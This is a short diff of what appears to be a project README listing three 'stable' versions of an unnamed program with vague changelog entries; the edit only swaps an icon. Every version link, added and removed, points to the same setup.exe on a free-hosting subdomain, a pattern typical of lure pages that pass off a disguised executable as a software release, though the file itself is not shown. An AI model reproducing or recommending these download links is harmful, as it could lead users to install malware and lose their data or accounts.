@@ -5,15 +5,15 @@
 
 
 
-## 💾 [Version - 7.8.4 - stable](http://s915550z.beget.tech/setup.exe)
+## ✅ [Version - 7.8.4 - stable](http://s915550z.beget.tech/setup.exe)
 ##### -Updating the database
 ##### -Added a section for bloggers
 
-## 💾 [Version - 7.8.2](http://s915550z.beget.tech/setup.exe)
+## ✅ [Version - 7.8.2](http://s915550z.beget.tech/setup.exe)
 ##### -Updating the interface
 ##### -Ability to invite partners via a referral link
 
-## 💾 [Version - 7.8.0](http://s915550z.beget.tech/setup.exe)
+## ✅ [Version - 7.8.0](http://s915550z.beget.tech/setup.exe)
 ##### -Minor corrections
 ##### -Improved display of coupons
 
